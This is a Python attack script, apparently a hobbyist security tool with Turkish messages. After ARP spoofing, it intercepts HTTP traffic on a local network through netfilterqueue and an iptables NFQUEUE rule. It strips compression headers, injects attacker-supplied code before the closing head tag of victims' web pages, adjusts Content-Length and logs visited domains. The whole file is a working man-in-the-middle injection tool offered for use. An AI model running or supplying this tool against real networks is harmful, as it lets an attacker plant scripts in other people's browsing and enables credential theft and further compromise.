#!/usr/bin/env python 3.7.2
# -*- coding: utf-8 -*-

import netfilterqueue
import re
from argparse import ArgumentParser
from termcolor import colored
import os
import sys
try:
	import scapy.all as scapy
except KeyboardInterrupt:
	print(colored("\n[-] CTRL+C basıldı.Lütfen bekleyiniz...", "red"))
	print(colored("[-] Uygulamadan çıkış yapıldı!", "red"))
	sys.exit()

class CodeInjector:
    def __init__(self):
        self.about()
        self.script_desc()
        self.injectionKod=""
        self.arguman_al()
        self.ip_forward(1)

    def arguman_al(self):
        parse = ArgumentParser(description=self.description,epilog=self.kullanim,prog=self.program)
        parse.add_argument("--kod", dest="kod", help="İnjection kodu")
        options = parse.parse_args()
        if not options.kod:
            parse.error(colored('[-] Lütfen bir İnjection kodu giriniz,daha fazla bilgi için --help kullanın.',"red"))
        else:
            self.injectionKod = options.kod

    def set_load(self,paket, load):
        paket[scapy.Raw].load = load
        del paket[scapy.IP].len
        del paket[scapy.IP].chksum
        del paket[scapy.TCP].chksum
        return paket

    def netfilterqueue(self):
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, self.paket_isle)
        queue.run()

    def paket_isle(self,pkt):
        try:
            paket = scapy.IP(pkt.get_payload())
            self.url(paket)

            if paket.haslayer(scapy.Raw):
                load = str(paket[scapy.Raw].load, 'iso-8859-1')
                if paket[scapy.TCP].dport == 80:
                    print(colored("[+] Request","green"))
                    load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

                elif paket[scapy.TCP].sport == 80:
                    print(colored("[+] Response","green"))
                    load=self.icerik_degistir(load)

                if load != paket[scapy.Raw].load:
                    degistirilmis_paket = self.set_load(paket, bytes(load, 'iso-8859-1','ignore'))
                    pkt.set_payload(bytes(degistirilmis_paket))
            pkt.accept()
        except (AttributeError,IndexError):
            pass
        except KeyboardInterrupt:
            self.keyboardInterrupt_message()
            os._exit(1)


    def url(self,paket):
        if paket.haslayer(scapy.DNSRR):
            url = (paket[scapy.DNSQR].qname).decode("utf-8")
            url = url[:-1]
            print("[*] URL >> " + url)

    def icerik_degistir(self,load):
        load = load.replace("</head>", self.injectionKod + "</head>")
        icerik_uzunluk_ara = re.search("(?:Content-Length:\s)(\d*)", load)
        if icerik_uzunluk_ara and "text/html" in load:
            icerik_uzunluk = icerik_uzunluk_ara.group(1)
            yeni_uzunluk = int(icerik_uzunluk) + len(self.injectionKod)
            load = load.replace(icerik_uzunluk, str(yeni_uzunluk))
        return load

    def ip_forward(self, value):
        if value == 1:
            os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')
        elif value == 2:
            os.system('iptables --flush')


    def script_desc(self):
        self.program = "codeInjector"
        self.kullanim = "Kullanim: python codeInjector.py --kod 'Injection Kodu'"
        self.description = "Aynı ağ içerisinde , ARP Spoofing saldırısı yapılmış hedef bilgisayarlarda , HTTP protokolünü kullanan web sitelerine kod enjekte ederek manipüle etmenize yarayan bir script."

    def about(self):
        print(colored(" _____           _        _____      _           _             ", "green"))
        print(colored("/  __ \         | |      |_   _|    (_)         | |            ", "green"))
        print(colored("| /  \/ ___   __| | ___    | | _ __  _  ___  ___| |_ ___  _ __ ", "green"))
        print(colored("| |    / _ \ / _` |/ _ \   | || '_ \| |/ _ \/ __| __/ _ \| '__|", "green"))
        print(colored("| \__/\ (_) | (_| |  __/  _| || | | | |  __/ (__| || (_) | |   ", "green"))
        print(colored(" \____/\___/ \__,_|\___|  \___/_| |_| |\___|\___|\__\___/|_|   ", "green"))
        print(colored("                                   _/ |                        ", "green"))
        print(colored("                                  |__/                         ", "green"))
        print(colored("# ==============================================================================", "green"))
        print(colored("# author      	:", "green") + "Mustafa Dalga")
        print(colored("# linkedin    	:", "green") + "https://www.linkedin.com/in/mustafadalga")
        print(colored("# github      	:", "green") + "https://github.com/mustafadalga")
        print(colored("# description 	:", "green") + "HTTP protokolünü kullanan web sitelerine kod enjekte ederek manipüle etmenize yarayan bir script.")
        print(colored("# date        	:", "green") + "04.06.2019")
        print(colored("# version     	:", "green") + "1.0")
        print(colored("# python_version:",  "green") + "3.7.2")
        print(colored("# ==============================================================================", "green"))

    def keyboardInterrupt_message(self):
        print(colored("\n[-] CTRL+C basıldı.", "red"))
        print(colored("[*] İptables ayarları sıfırlanıyor... Lütfen bekleyin", "blue"))
        injector.ip_forward(2)
        print(colored("[-] Uygulamadan çıkış yapıldı!", "red"))


try:
	injector=CodeInjector()
	injector.netfilterqueue()
except KeyboardInterrupt:
    injector.keyboardInterrupt_message()
    sys.exit()
